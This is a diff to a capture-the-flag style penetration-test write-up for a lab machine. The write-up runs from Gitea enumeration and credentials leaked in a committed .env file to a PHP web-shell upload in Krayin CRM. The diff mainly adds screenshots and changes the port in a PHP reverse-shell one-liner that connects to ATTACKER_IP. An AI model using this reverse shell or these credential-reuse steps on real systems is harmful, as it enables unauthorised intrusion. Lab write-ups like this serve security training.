@@ -75,8 +75,6 @@ Further investigation of the HTTP service revealed two relevant applications:
 - Gitea – version 1.26.0.
 - Billing application – hosted at `billing.nexus.htb`.
 
----
-
 ## 4. Enumeration
 
 ### 4.1 Gitea – Source Code Management
@@ -86,11 +84,14 @@ During web enumeration, a Gitea instance was discovered.
 **Identified application:** Gitea  
 **Version:** 1.26.0
 
+<img width="1920" height="1140" alt="Screenshot 2026-11-01 160201" src="https://github.com/user-attachments/assets/4ca04b09-202d-4f76-a81f-cec94ee6bb72" />
+
 The Git repository was inspected for potentially sensitive information.
 
 During repository enumeration, an `.env` file was discovered. It contained credentials that were later used to obtain SSH access.
 
 This finding demonstrated the security risks associated with storing sensitive credentials in source-code repositories.
+
 
 ### 4.2 Billing Application – Krayin CRM
 
@@ -105,6 +106,8 @@ Accessing the hostname redirected to:
 The login page revealed that the application was running Krayin CRM.
 
 Previously discovered credentials were used to authenticate:
+
+<img width="1920" height="1140" alt="Screenshot 2026-11-01 160712" src="https://github.com/user-attachments/assets/d99b1016-fb2e-4fca-94cf-c90ae2359aa9" />
 
 | Parameter | Value |
 |---|---|
@@ -158,6 +161,7 @@ A PHP web shell was prepared for testing:
 ```
 
 The script uses the PHP `shell_exec()` function to execute operating-system commands supplied through the `c` parameter.
+<img width="1920" height="1140" alt="Screenshot 2026-11-01 161553" src="https://github.com/user-attachments/assets/d4c91ff3-877b-4478-bc6e-30aa13dfd6f3" />
 
 Example request:
 
@@ -172,7 +176,7 @@ Successful execution would demonstrate that commands could be executed through t
 After the file-upload exploitation, a PHP reverse-shell payload was prepared.
 
 ```bash
-php -r '$sock=fsockopen("ATTACKER_IP",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("ATTACKER_IP",8022);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 The payload was URL-encoded before being submitted.
@@ -180,6 +184,7 @@ The payload was URL-encoded before being submitted.
 A listener was configured on the attacking machine to receive the incoming connection.
 
 After successful execution, a reverse shell was established.
+<img width="1920" height="1140" alt="Screenshot 2026-11-01 162147" src="https://github.com/user-attachments/assets/a4f8b93f-38b0-4596-9542-8bf5fbec0171" />
 
 ### 6.3 Shell Stabilization
 
